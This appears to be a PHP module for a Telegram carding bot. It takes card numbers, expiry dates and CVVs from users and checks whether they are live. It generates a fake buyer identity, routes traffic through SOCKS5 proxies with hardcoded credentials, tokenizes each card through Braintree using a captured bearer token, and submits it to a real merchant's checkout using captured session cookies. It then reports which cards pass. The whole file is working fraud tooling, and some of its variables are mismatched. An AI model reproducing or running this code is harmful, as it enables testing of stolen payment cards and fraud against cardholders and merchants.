<?php
error_reporting(0);
ini_set('display_errors', 0);
include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";

if(strpos($message, '!sss') === 0 or strpos($message, '/sss') === 0 or strpos($message, '.sss') === 0)
{
    $starttime = microtime(true);
    sendaction($chat_id, "typing");

    $antispam = antispamCheck($userId);
    addUser($userId);
    if($antispam != False){
        $delay = microtimeFormat($starttime);
        $result = urlencode("[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.");
        $sss = reply_to($chat_id,$message_id,$keyboard,$result);
        $respon = json_decode($sss, TRUE);
        $message_id_1 = $respon['result']['message_id'];
        return;
    }else{
        //==============MENSAJE DE BIENVENIDA=======================//
        // $time_end = microtime(true);
        // $duration = $time_end - $starttime;
        $delay = microtimeFormat($starttime);
        $result = urlencode("<b>••• 🟥ESPERE VALIDANDO...
••• ⌛Time ➜  $delay Segs
••• 👨🏻Checked by UserId➜  $userId
••• 🧑🏻‍💻Bot by ➜  @Z_tJKkeZQoZlcssuXjVjNerQ</b>");
        $sss = reply_to($chat_id,$message_id,$keyboard,$result);
        $respon = json_decode($sss, TRUE);
        $message_id_1 = $respon['result']['message_id'];
        
        // echo "TIME>".$delay;
        // echo "\nRESPONSE:".$sss;
        // echo "\nMessage id ".$message_id_1;
        //=============================================================//
        //===================AREA DE GATE==============================//
        $flag = 'getFlags';
        $lista = substr($message, 5);
        $lista = clean($lista);
        $check = strlen($lista);
        $chem = substr($lista, 0,1);
        $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
        $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
        $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
        $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
        $strlenn = strlen($cc);
        $strlen1 = strlen($mes);
        $ano1 = $ano;
        $list = preg_replace('/\s/', '|', $lista);
        $vaut = array(1,2,7,8,9,0);

        if (in_array($chem, $vaut)) { 
            reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
        } 

        if (empty($lista)){
            reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
        }elseif($check<15){
            reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
        }elseif(strlen($strlenn != 16)){
            reply_to($chat_id, $message_id,$keyboard,$validauth); exit();
        }
        if(strlen($strlen1 > 2)) {
            $ano = $cvv; 
            $cvv = $mes;
            $mes = $ano1;
        }
        sleep(1);
        $delay2 = microtimeFormat($starttime);
        $result2 = urlencode("<b>
••• 💳CC ->> <code>$cc|$mes|$ano|$cvv</code> 
••• 🔋PROCESS ->> □□□□□ 10%[🟨] 
••• ⌛TIME ->> $delay2 s 
••• 👨🏻CHECKING BY ->> <a href='tg://user?id='>@$userId</a> 
••• 🧑🏻‍💻BOT BY :- <code>@Z_tJKkeZQoZlcssuXjVjNerQ</code></b>");
        $sss1 = reply_to2($chat_id,$message_id_1,$keyboard,$result2);
        // $sss = reply_to2($chat_id,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <code>@ANONBD</code></b>");
        $respon2 = json_decode($sss1, TRUE);
        $message_id_2 = $respon2['result']['message_id'];

        echo "TIME>".$delay2;
        echo "\nRESPONSE:".$sss1;
        echo "\nMessage id ".$message_id_2;
        //=============================FAKE USER GENERATOR=============================//
        $get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $first = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        $state1 = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $zip = $matches1[1][0];
        preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
        $usrnme = $matches1[1][0];
        preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
        $pass = $matches1[1][0];
        preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
        $salt = $matches1[1][0];
        $pwd = ''.$pass.''.$salt.'';
        preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
        $con = $matches1[1][0];
        $numero1 = substr($phone, 1,3);
        $numero2 = substr($phone, 6,3);
        $numero3 = substr($phone, 10,4);
        $phone = $numero1.''.$numero2.''.$numero3;
        $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
        $serv_rnd = $serve_arr[array_rand($serve_arr)];
        $email = str_replace("example.com", $serv_rnd, $email);
        // echo "NAME>".$first." ".$last."\n"."Direccion>".$street."\n"."Ciudad".$city."\n"."Estado".$state;
        //==================================================================================================//
        //==================[BIN LOOK-UP]======================//
        $ch = curl_init();
        $bin = substr($cc, 0,6);
        curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $bindata = curl_exec($ch);
        $binna = json_decode($bindata,true);
        $brand = $binna['scheme'];
        $country = $binna['country']['name'];
        $type = $binna['type'];
        $bank = $binna['bank']['name'];
        curl_close($ch);
        //==================[BIN LOOK-UP-END]======================//
        ###CHECKER PART###  
                
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = capture($fim, '"bank":{"name":"', '"');
        $cname = capture($fim, '"name":"', '"');
        $brand = capture($fim, '"brand":"', '"');
        $country = capture($fim, '"country":{"name":"', '"');
        $phone = capture($fim, '"phone":"', '"');
        $scheme = capture($fim, '"scheme":"', '"');
        $type = capture($fim, '"type":"', '"');
        $emoji = capture($fim, '"emoji":"', '"');
        $currency = capture($fim, '"currency":"', '"');
        $binlenth = strlen($bin);
        $schemename = ucfirst("$scheme");
        $typename = ucfirst("$type");
        curl_close($ch);
        
        
        /////////////////////==========[Unavailable if empty]==========////////////////
        //==============================ZONA DE PASO1 GATE=========================//
        ///////////////////////////////////////////////////=========[PROXY]

        function rebootproxys()
        {
            $poxySocks = file("proxy.txt");
            $myproxy = rand(0, sizeof($poxySocks) - 1);
            $poxySocks = $poxySocks[$myproxy];
            return $poxySocks;
        }
        $poxySocks4 = rebootproxys();

        $username = 'LYHBl6a1ssT'; 
        $password = 'zc7l6f4Tn'; 
        $socks = array_rand($ip);
        $proxy = $ip[$socks];
        
        $proxiss = explode(":", $poxySocks4);        

        ///////////////////////////////////////////////////=========[Authorizing Cards]
        $ch = curl_init();

        //////////======= Socks Proxy
        //curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
        curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
        curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"276aac21-a69a-4000-9bc3-dd4b716dbe42"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4737030030702574","expirationMonth":"01","expirationYear":"2024","cvv":"147","cardholderName":"NIce NAme","billingAddress":{"countryName":"United States","locality":"Santa Barbara","region":"California","firstName":"NIce","lastName":"NAme","postalCode":"93101-3840","streetAddress":"122 Los Aguajes Ave Apt 1"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
        //// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
        $headers = array();
        $headers[] = 'Accept: */*';
        $headers[] = 'Accept-Language: en-US,en;q=0.9';
        $headers[] = 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MjMwOTMxMzksImp0aSI6IjJkNzNmY2UyLTk4ZTAtNGY1NC05YWUyLTMzNDVmNTEzZDIyNyIsInN1YiI6IjdqaHliOTl5emMzcGJyZ2oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjdqaHliOTl5emMzcGJyZ2oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiTWlnaHR5TmVzdF9pbnN0YW50In19.voKWPxsexCtqNQ4kkcnvfIAv1PRlWUvRxYI4-8za6gylwq3eUG_A2o7w9-U2MS9GvF7RzPuKLZrGfRyBo_wa2Q';
        $headers[] = 'Braintree-Version: 2018-05-10';
        $headers[] = 'Connection: keep-alive';
        $headers[] = 'Content-Type: application/json';
        $headers[] = 'Host: payments.braintree-api.com';
        $headers[] = 'Origin: https://assets.braintreegateway.com';
        $headers[] = 'Referer: https://assets.braintreegateway.com/';
        $headers[] = 'sec-ch-ua-mobile: ?0';
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Sec-Fetch-Site: cross-site';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($ch);
        $token = trim(strip_tags(getStr($result,'"token":"','"')));
        curl_close($ch);
        echo $token;

        //====================================================//
        $ch = curl_init();
        //////////======= Socks Proxy
        //curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
        curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
        curl_setopt($ch, CURLOPT_URL, 'https://mightynest.com/checkout/update/payment');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'utf8=%E2%9C%93&_method=patch&authenticity_token=YMKT%2BD8l0Xp4%2Fk44w4wpLNvWdDtIJwjUW5C%2F%2FpKI4pDVA6lULgAW9r%2FisK8prJNwZ61A%2Fmru6UgMl0MHgeCI9w%3D%3D&order%5Bstate_lock_version%5D=4&order%5Bcoupon_code%5D=&use_existing_card=no&order%5Bpayments_attributes%5D%5B%5D%5Bpayment_method_id%5D=5&payment_source%5B5%5D%5Bname%5D=NIce+NAme&payment_source%5B5%5D%5Bpayment_method_nonce%5D=tokencc_bh_sxdpwq_mw2qhy_sm2wsn_cwhxty_v23&payment_source%5B5%5D%5Bencrypted_data%5D=1&order%5Buse_shipping%5D=1&order%5Bbill_address_attributes%5D%5Bid%5D=705362');
        //// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
        $headers = array();
        $headers[] = 'authority: mightynest.com';
        $headers[] = 'method: POST';
        $headers[] = 'path: /checkout/update/payment';
        $headers[] = 'scheme: https';
        $headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
        $headers[] = 'accept-language: en-US,en;q=0.9';
        $headers[] = 'content-type: application/x-www-form-urlencoded';
        $headers[] = 'cookie: mightynest_uuid=2d28c12e-5357-4a59-9278-ed32d6b5f288; guest_token=BAhJIihqOWlaQWJ5SzVCLUVvVDFMV0FmOXpnMTYyMzAwNTQ3MTQ4NAY6BkVU--e0a367adf7d4fda00fd83b48fc7004683079c00d; cart_item_count=0; box_item_count=-1; _ga=GA1.2.1533115231.1623005476; _gid=GA1.2.636846353.1623005476; _fbp=fb.1.1623005477557.525649401; first_landing_page=https%3A//mightynest.com/; last_landing_page=https%3A//mightynest.com/; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2MjMwMDU0NzksInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vbWlnaHR5bmVzdC5jb20vIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjIzMDA1NDg0LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL21pZ2h0eW5lc3QuY29tLyJ9fQ==; SL_C_23361dd035530_KEY=b855d2678f43421098506c5fba485e5e0484a264; SL_C_23361dd035530_VID=O8NLkkH8Tb; SL_C_23361dd035530_SID=w6hL2vvyXYq; _mightyschools_session=VEhEQ3JSWTdoMXpDSjFxVHlrVE8yNC9IUWJ4clFxeHVDM3BtR2xtVEhqVENNVlJRTUowdVcrRlVnbDkxem9DUXBrWGRDY3RuSXUzMlh2Q1VSeGw0V0NEYjB4UGIzOGNETHJOQzhsR0xpbFBPWVJsVGY1SlhhcE9LcjFSWFRkUWU1ZlpEOVIwcjlvNEFjcDVXWk9sUGgzVGNWRG8zeXRaRVFpSWx1NmNJSXVvTURoR1lMNFhoMGN6K1R5bi9QeXBkbnN6R0V5V3hHNllicnl4UnJEeDBXQmUrZFZNaTNnUEJnTDRhWVloMExLaVA3amJtd2gycmpLbTRrUkp4Yko5WThIc2FMMGljODY0N0dGVjc2YnRmekV3QS9sbEtMU1Vkak1BdVIwaDRyZFQ0TnJCYVh4SWdZam5XWkpFaFJ2SVRDanY5RWlhenNGVXI2YVM0S2hvLzZtY3draExDNWJYdkc5NWhnSU1TZTJiUkVGVVBGZzJlMEJoeWZOckZuSUIwNVAwbllvUDRXNmZSRlhNZkQ5eEpoZz09LS1mOWJ4SlVJdUQvS3B1MXc4Zjgrb0dBPT0%3D--278078bca8fecb7fb848c155f868bcd36e2cfc56';
        $headers[] = 'origin: https://mightynest.com';
        $headers[] = 'referer: https://mightynest.com/checkout/payment';
        $headers[] = 'sec-fetch-dest: document';
        $headers[] = 'sec-fetch-mode: navigate';
        $headers[] = 'sec-fetch-site: same-origin';
        $headers[] = 'sec-fetch-user: ?1';
        $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($ch);
        echo $result;
        $msg = trim(strip_tags(getStr2($response,'"message":"','"')));
        curl_close($ch);

        if((strpos($msg, '1000'))){
            addTotal();
            addUserTotal($userId);
            addCCN();
            addUserCCN($userId);
            addCVV();
            addUserCVV($userId);
            $delay3 = microtimeFormat($starttime);
            $result3 = urlencode("<b>Status -» [BRAINTREE CVV_] 🟩
Response -» <code>$msj</code>
Gateway -» BRAINTREE Auth
Time -» <b>$delay3</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
            $sss2 = reply_to2($chat_id,$message_id_2,$keyboard,$result3);
            $result3 = json_decode($sss2, TRUE);
            $message_id_3 = $respon3['result']['message_id'];

            // echo "TIME>".$delay2;
            // echo "\nRESPONSE:".$sss1;
            // echo "\nMessage id ".$message_id_2;
            return;
        }elseif(strpos($msg, 'Your payment could not be taken. Please try again or use a different payment method. Card Issuer Declined CVV')){
            addTotal();
            addUserTotal($userId);
            $delay3 = microtimeFormat($starttime);
            $result3 = urlencode("<b>Status -» [BRAINTREE CCN_] 🟩
Response -» <code>$msj</code>
Gateway -» BRAINTREE Auth
Time -» <b>$delay3</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
            $sss2 = reply_to2($chat_id,$message_id_2,$keyboard,$result3);
            $result3 = json_decode($sss2, TRUE);
            $message_id_3 = $respon3['result']['message_id'];
        }
        elseif(strpos($msg, 'Your payment could not be taken. Please try again or use a different payment method. Declined')) {
            $delay3 = microtimeFormat($starttime);
            $result3 = urlencode("<b>Status -» [BRAINTREE DECLINED🟨] 🟩
Response -» <code>$msj</code>
Gateway -» BRAINTREE Auth
Time -» <b>$delay3</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
            $sss2 = reply_to2($chat_id,$message_id_2,$keyboard,$result3);
            $result3 = json_decode($sss2, TRUE);
            $message_id_3 = $respon3['result']['message_id'];
        }elseif(strpos($msg, 'Your payment could not be taken. Please try again or use a different payment method. Processor Declined')) {
            $delay3 = microtimeFormat($starttime);
            $result3 = urlencode("<b>Status -» [BRAINTREE DECLINED🟥]
Response -» <code>$msj</code>
Gateway -» BRAINTREE Auth
Time -» <b>$delay3</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
            $sss2 = reply_to2($chat_id,$message_id_2,$keyboard,$result3);
            $result3 = json_decode($sss2, TRUE);
            $message_id_3 = $respon3['result']['message_id'];
        }
        elseif(strpos($msg, 'Your payment could not be taken. Please try again or use a different payment method. Declined')) {
            $delay3 = microtimeFormat($starttime);
            $result3 = urlencode("<b>Status -» [BRAINTREE DECLINED🟥]
Response -» <code>$msj</code>
Gateway -» BRAINTREE Auth
Time -» <b>$delay3</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
            $sss2 = reply_to2($chat_id,$message_id_2,$keyboard,$result3);
            $result3 = json_decode($sss2, TRUE);
            $message_id_3 = $respon3['result']['message_id'];
        }else{
            $delay3 = microtimeFormat($starttime);
            $result3 = urlencode("<b>Status -» [DECLINED UNKNOWN🟥]
Response -» <code>$msj</code>
Gateway -» BRAINTREE Auth
Time -» <b>$delay3</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
            $sss2 = reply_to2($chat_id,$message_id_2,$keyboard,$result3);
            $result3 = json_decode($sss2, TRUE);
            $message_id_3 = $respon3['result']['message_id'];
        }
    }
}
function getStr2($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
?>